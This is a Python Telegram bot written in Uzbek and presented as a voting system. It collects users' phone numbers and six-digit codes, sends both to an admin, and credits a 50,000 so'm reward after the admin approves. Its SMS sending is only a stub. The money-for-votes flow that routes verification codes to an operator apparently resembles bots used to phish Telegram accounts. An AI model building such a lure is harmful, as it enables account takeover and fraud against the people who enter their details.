import asyncio
import random
import asyncpg
import os
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from dotenv import load_dotenv

load_dotenv()

# ================= KONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

DB_CONFIG = {
    "host": os.getenv("DB_HOST"),
    "port": os.getenv("DB_PORT"),
    "database": os.getenv("DB_NAME"),
    "user": os.getenv("DB_USER"),
    "password": os.getenv("DB_PASSWORD")
}

# ================= BOT =================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Foydalanuvchi holatlari
user_states = {}  # {telegram_id: "waiting_phone" yoki "waiting_code"}
user_phones = {}  # {telegram_id: phone_number}
user_codes = {}   # {telegram_id: code}

# Admin holati (xabar yozish uchun)
admin_states = {}  # {admin_id: "waiting_message"}

# Telefon raqam tugmasi
phone_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📞 Telefon raqamni yuborish", request_contact=True)]],
    resize_keyboard=True
)

# Admin tugmalari
admin_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="📊 Statistika")],
        [KeyboardButton(text="📨 Barchaga xabar yuborish")],
        [KeyboardButton(text="📋 Kutayotgan kodlar")]
    ],
    resize_keyboard=True
)

# ================= POSTGRESQL =================
async def get_db():
    return await asyncpg.connect(
        host=DB_CONFIG["host"],
        port=DB_CONFIG["port"],
        database=DB_CONFIG["database"],
        user=DB_CONFIG["user"],
        password=DB_CONFIG["password"]
    )

# ================= SMS YUBORISH =================
async def send_sms(phone: str, code: str):
    """Haqiqiy SMS yuborish - Eskiz.uz"""
    print(f"📨 SMS yuborildi: {phone} -> Kod: {code}")
    # Bu yerga real SMS xizmat qo'shing
    return True

# ================= 1. BOSHLASH =================
@dp.message(Command("start"))
async def start(message: types.Message):
    telegram_id = message.from_user.id
    
    # Admin bo'lsa
    if telegram_id == ADMIN_ID:
        await message.answer(
            "👋 *Admin paneliga xush kelibsiz!*\n\n"
            "📊 Statistika - foydalanuvchilar soni\n"
            "📨 Barchaga xabar yuborish\n"
            "📋 Kutayotgan kodlar",
            parse_mode="Markdown",
            reply_markup=admin_menu
        )
        return
    
    # Oddiy foydalanuvchi
    user_states[telegram_id] = "waiting_phone"
    await message.answer(
        "🇺🇿 *Ovoz berish tizimi*\n\n"
        "📱 Iltimos, telefon raqamingizni yuboring:",
        reply_markup=phone_keyboard,
        parse_mode="Markdown"
    )

# ================= 2. TELEFON RAQAM =================
@dp.message(lambda msg: msg.contact is not None and msg.from_user.id != ADMIN_ID)
async def receive_phone(message: types.Message):
    phone = message.contact.phone_number
    telegram_id = message.from_user.id
    
    # Saqlash
    user_phones[telegram_id] = phone
    user_states[telegram_id] = "waiting_code"
    
    # 1. Foydalanuvchini bazaga saqlash
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
            "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
            telegram_id, phone
        )
    finally:
        await conn.close()
    
    # 2. Kod yaratish
    code = str(random.randint(100000, 999999))
    user_codes[telegram_id] = code
    
    # 3. Kodni bazaga yozish
    conn = await get_db()
    try:
        await conn.execute(
            "INSERT INTO sms_codes (phone, code, telegram_id, status) "
            "VALUES ($1, $2, $3, 'pending')",
            phone, code, telegram_id
        )
    finally:
        await conn.close()
    
    # 4. SMS yuborish
    await send_sms(phone, code)
    
    # 5. Foydalanuvchiga xabar
    await message.answer(
        f"✅ *{phone}* raqamiga kod yuborildi!\n\n"
        f"📨 SMS da kelgan *6 xonali kodni* kiriting:",
        parse_mode="Markdown"
    )
    
    # 6. ADMIN'GA XABAR
    await bot.send_message(
        ADMIN_ID,
        f"📱 *Yangi foydalanuvchi*\n"
        f"👤 ID: `{telegram_id}`\n"
        f"📞 Telefon: `{phone}`\n"
        f"🔑 Kod: `{code}`\n"
        f"⏳ Holat: *Kod yuborildi*",
        parse_mode="Markdown"
    )

# ================= 3. KODNI QABUL QILISH =================
@dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
async def receive_code(message: types.Message):
    code = message.text.strip()
    telegram_id = message.from_user.id
    phone = user_phones.get(telegram_id)
    
    # Kod formatini tekshirish
    if not phone or len(code) != 6 or not code.isdigit():
        await message.answer("❌ 6 xonali kodni kiriting:")
        return
    
    # Kodni tekshirish
    conn = await get_db()
    try:
        existing = await conn.fetchrow(
            "SELECT * FROM sms_codes WHERE phone = $1 AND code = $2 AND status = 'pending'",
            phone, code
        )
        
        if existing:
            # Foydalanuvchiga xabar
            await message.answer(
                "⏳ *Kod qabul qilindi!*\n\n"
                "Admin tomonidan tekshirilmoqda...",
                parse_mode="Markdown"
            )
            
            # ADMIN'GA TASDIQLASH UCHUN TUGMALAR
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [
                        InlineKeyboardButton(
                            text="✅ Tasdiqlash (+50 000 so'm)",
                            callback_data=f"verify_{telegram_id}_{phone}_{code}"
                        )
                    ],
                    [
                        InlineKeyboardButton(
                            text="❌ Rad etish",
                            callback_data=f"reject_{telegram_id}"
                        )
                    ]
                ]
            )
            
            await bot.send_message(
                ADMIN_ID,
                f"🔑 *Kod kelib tushdi!*\n\n"
                f"👤 Foydalanuvchi ID: `{telegram_id}`\n"
                f"📞 Telefon: `{phone}`\n"
                f"🔢 Kod: `{code}`\n\n"
                f"✅ Kodni tasdiqlang yoki rad eting:",
                parse_mode="Markdown",
                reply_markup=keyboard
            )
            
            # Holatni o'zgartirish
            user_states[telegram_id] = "verified"
            
        else:
            await message.answer(
                "❌ *Noto'g'ri kod!*\n\n"
                "Qaytadan urinib ko'ring.",
                parse_mode="Markdown"
            )
            
    finally:
        await conn.close()

# ================= 4. ADMIN TASDIQLASH / RAD ETISH =================
@dp.callback_query(lambda c: c.data.startswith(("verify_", "reject_")))
async def admin_action(callback: types.CallbackQuery):
    data = callback.data.split("_")
    action = data[0]
    
    if action == "verify":
        telegram_id = int(data[1])
        phone = data[2]
        code = data[3]
        
        conn = await get_db()
        try:
            # 1. Kod statusini o'zgartirish
            result = await conn.execute(
                "UPDATE sms_codes SET status = 'verified' "
                "WHERE phone = $1 AND code = $2 AND telegram_id = $3 AND status = 'pending'",
                phone, code, telegram_id
            )
            
            if result == "UPDATE 1":
                # 2. Balansga +50 000
                await conn.execute(
                    "UPDATE users SET balance = balance + 50000 WHERE telegram_id = $1",
                    telegram_id
                )
                
                # 3. Transaksiya
                await conn.execute(
                    "INSERT INTO transactions (telegram_id, amount, type) "
                    "VALUES ($1, 50000, 'bonus')",
                    telegram_id
                )
                
                # 4. Foydalanuvchiga xabar
                await bot.send_message(
                    telegram_id,
                    "✅ *Tasdiqlandi!* 🎉\n\n"
                    "💰 Hisobingizga *50 000 so'm* qo'shildi!\n\n"
                    "Rahmat! ✅",
                    parse_mode="Markdown"
                )
                
                # 5. Admin'ga javob
                await callback.message.edit_text(
                    f"✅ *Foydalanuvchi tasdiqlandi!*\n"
                    f"👤 ID: `{telegram_id}`\n"
                    f"📞 Telefon: `{phone}`\n"
                    f"💰 +50 000 so'm",
                    parse_mode="Markdown"
                )
                await callback.answer("✅ Tasdiqlandi!")
                
        finally:
            await conn.close()
    
    elif action == "reject":
        telegram_id = int(data[1])
        
        conn = await get_db()
        try:
            # Kod statusini o'zgartirish
            await conn.execute(
                "UPDATE sms_codes SET status = 'expired' "
                "WHERE telegram_id = $1 AND status = 'pending'",
                telegram_id
            )
            
            # Foydalanuvchiga xabar
            await bot.send_message(
                telegram_id,
                "❌ *Kod rad etildi!*\n\n"
                "Iltimos, qaytadan urinib ko'ring.",
                parse_mode="Markdown"
            )
            
            # Admin'ga javob
            await callback.message.edit_text(
                f"❌ *Foydalanuvchi rad etildi!*\n"
                f"👤 ID: `{telegram_id}`",
                parse_mode="Markdown"
            )
            await callback.answer("❌ Rad etildi")
            
        finally:
            await conn.close()

# ================= 5. ADMIN MENU =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
async def admin_stats(message: types.Message):
    conn = await get_db()
    try:
        # Foydalanuvchilar soni
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        
        # Balanslar
        total_balance = await conn.fetchval("SELECT SUM(balance) FROM users")
        
        # Bugungi
        today = await conn.fetchval(
            "SELECT COUNT(*) FROM users WHERE DATE(created_at) = CURRENT_DATE"
        )
        
        # Kodlar
        pending = await conn.fetchval(
            "SELECT COUNT(*) FROM sms_codes WHERE status = 'pending'"
        )
        verified = await conn.fetchval(
            "SELECT COUNT(*) FROM sms_codes WHERE status = 'verified'"
        )
        
        await message.answer(
            f"📊 *Statistika*\n\n"
            f"👥 Foydalanuvchilar: *{users_count}*\n"
            f"💰 Jami balans: *{total_balance or 0:,} so'm*\n"
            f"📅 Bugun: *{today}*\n\n"
            f"⏳ Kutayotgan: *{pending}*\n"
            f"✅ Tasdiqlangan: *{verified}*",
            parse_mode="Markdown"
        )
    finally:
        await conn.close()

# ================= 6. KUTAYOTGAN KODLAR =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📋 Kutayotgan kodlar")
async def pending_codes(message: types.Message):
    conn = await get_db()
    try:
        codes = await conn.fetch(
            "SELECT * FROM sms_codes WHERE status = 'pending' ORDER BY created_at DESC LIMIT 20"
        )
        
        if codes:
            text = "📋 *Kutayotgan kodlar:*\n\n"
            for c in codes:
                text += f"👤 ID: `{c['telegram_id']}`\n"
                text += f"📞 Telefon: `{c['phone']}`\n"
                text += f"🔑 Kod: `{c['code']}`\n"
                text += f"⏰ {c['created_at']}\n"
                text += "-" * 20 + "\n"
            
            await message.answer(text, parse_mode="Markdown")
        else:
            await message.answer("📭 Kutayotgan kodlar yo'q")
    finally:
        await conn.close()

# ================= 7. BARCHAGA XABAR YUBORISH =================
@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar yuborish")
async def send_all_start(message: types.Message):
    admin_states[ADMIN_ID] = "waiting_message"
    await message.answer(
        "📨 *Barchaga xabar yuborish*\n\n"
        "Iltimos, yubormoqchi bo'lgan xabaringizni yozing:\n"
        "(Bekor qilish uchun /cancel)",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.from_user.id == ADMIN_ID and admin_states.get(ADMIN_ID) == "waiting_message")
async def send_all_message(message: types.Message):
    if message.text == "/cancel":
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)
        return
    
    text = message.text
    admin_states.pop(ADMIN_ID, None)
    
    # Foydalanuvchilarni olish
    conn = await get_db()
    try:
        users = await conn.fetch("SELECT telegram_id FROM users")
        
        if not users:
            await message.answer("❌ Foydalanuvchilar yo'q!")
            return
        
        # Xabarni saqlash
        await conn.execute(
            "INSERT INTO admin_messages (admin_id, message_text) VALUES ($1, $2)",
            ADMIN_ID, text
        )
        
        # Yuborish
        sent = 0
        failed = 0
        
        await message.answer(f"⏳ Xabar {len(users)} ta foydalanuvchiga yuborilmoqda...")
        
        for user in users:
            try:
                await bot.send_message(
                    user['telegram_id'],
                    f"📨 *Admin xabari*\n\n{text}",
                    parse_mode="Markdown"
                )
                sent += 1
                await asyncio.sleep(0.05)  # Tezlik chegarasi
            except:
                failed += 1
        
        # Xabar sonini yangilash
        await conn.execute(
            "UPDATE admin_messages SET sent_count = $1 WHERE id = (SELECT MAX(id) FROM admin_messages)",
            sent
        )
        
        await message.answer(
            f"✅ *Xabar yuborildi!*\n\n"
            f"✅ Yuborildi: *{sent}*\n"
            f"❌ Yuborilmadi: *{failed}*",
            parse_mode="Markdown",
            reply_markup=admin_menu
        )
        
    finally:
        await conn.close()

# ================= 8. BALANSNI TEKSHIRISH =================
@dp.message(Command("balance"))
async def check_balance(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👋 Admin panelda /start bosing")
        return
    
    conn = await get_db()
    try:
        user = await conn.fetchrow(
            "SELECT balance FROM users WHERE telegram_id = $1",
            message.from_user.id
        )
        
        if user:
            await message.answer(
                f"💰 Balans: *{user['balance']:,} so'm*",
                parse_mode="Markdown"
            )
        else:
            await message.answer("❌ Ro'yxatdan o'tmagan. /start")
    finally:
        await conn.close()

# ================= 9. BEKOR QILISH =================
@dp.message(Command("cancel"))
async def cancel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        admin_states.pop(ADMIN_ID, None)
        await message.answer("❌ Bekor qilindi!", reply_markup=admin_menu)

# ================= 10. ISHGA TUSHIRISH =================
async def main():
    print("🤖 Bot ishga tushmoqda...")
    
    # PostgreSQL ni tekshirish
    try:
        conn = await get_db()
        await conn.close()
        print("✅ PostgreSQL ga ulandi!")
    except Exception as e:
        print(f"❌ PostgreSQL xatosi: {e}")
        return
    
    print("✅ Bot tayyor!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
